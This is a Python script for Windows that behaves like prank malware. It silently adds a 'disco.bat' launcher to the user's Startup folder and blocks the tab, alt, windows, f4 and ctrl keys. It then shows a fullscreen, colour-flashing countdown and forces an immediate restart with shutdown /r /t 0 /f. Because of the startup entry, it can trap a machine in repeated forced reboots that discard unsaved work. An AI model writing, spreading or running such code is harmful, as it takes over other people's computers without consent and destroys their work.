import os
import tkinter as tk
import subprocess
from tkinter import messagebox
import keyboard
import winreg as reg

# Keys to block
blocked_keys = ['tab', 'alt', 'windows', 'f4', 'ctrl']

def restart_computer():
    try:
        # Initiate computer restart
        subprocess.call(["shutdown", "/r", "/t", "0", "/f"])
    except Exception as e:
        print("Error:", e)

def main():
    root = tk.Tk()
    root.attributes('-fullscreen', True)  # Set fullscreen
    root.title("Countdown Popup")

    countdown_label = tk.Label(root, text="", font=("Helvetica", 48))
    countdown_label.pack(expand=True)

    instruction_label = tk.Label(root, text="Guess the correct key to close this pop-up", font=("Helvetica", 24))
    instruction_label.pack(expand=True)

    countdown(10, countdown_label, root, instruction_label)  # Countdown from 10 seconds with background color change

    root.bind("<Escape>", lambda event: close_fullscreen(root))

    root.mainloop()

def countdown(seconds, label, root, instruction):
    colors = ['#FFFF00', '#00FFFF', '#FF00FF', '#FF7F50', '#6495ED', '#7FFFD4', '#FFD700', '#8A2BE2', '#32CD32', '#FF69B4']  # List of background colors to cycle through
    bg_index = 0  # Index to track the current background color
    if seconds >= 0:
        minutes = seconds // 60
        seconds %= 60
        label.config(text=f"{minutes:02d}:{seconds:02d}")  # Update label text to mm:ss format
        label.after(1000, lambda: countdown(seconds - 1 if seconds > 0 else -1, label, root, instruction))  # Call countdown after 1 second
        bg_index = (bg_index + 1) % len(colors)  # Cycle through background colors
        root.config(bg=colors[bg_index])  # Set main window background color
        label.config(bg=colors[bg_index])
        instruction.config(bg=colors[bg_index])
        root.after(1000, lambda: change_background_color(root, colors))  # Change background color every 1000 milliseconds
        label.after(1000, lambda: change_background_color(label, colors))
        instruction.after(1000, lambda: change_background_color(instruction, colors))
    else:
        close_fullscreen(root)
        restart_computer()

def change_background_color(root, colors):
    current_color_index = colors.index(root.cget('bg'))
    next_color_index = (current_color_index + 1) % len(colors)
    root.config(bg=colors[next_color_index])
    root.after(400, lambda: change_background_color(root, colors))

def close_fullscreen(window):
    window.destroy()

def add_to_startup():
    # Get the path to the script
    script_path = os.path.abspath(__file__)
    
    # Get the path to the Startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    # Check if the batch file already exists in the Startup folder
    batch_file_path = os.path.join(startup_folder, 'disco.bat')
    if os.path.exists(batch_file_path):
        return
    else:
        # If the batch file does not exist, create it
        create_batch_file(startup_folder, script_path)

def create_batch_file(startup_folder, script_path):
    # Create the content for the batch file
    batch_content = f"""@echo off
    cd "{os.path.dirname(script_path)}"
    python "{script_path}" """

    # Write the batch content to a file
    with open(os.path.join(startup_folder, 'disco.bat'), 'w') as f:
        f.write(batch_content)

if __name__ == "__main__":
    # Add the script to startup using the Startup folder
    add_to_startup()
    
    # Block specified keys
    for key in blocked_keys:
        keyboard.block_key(key)
    
    # Open fullscreen countdown popup
    main()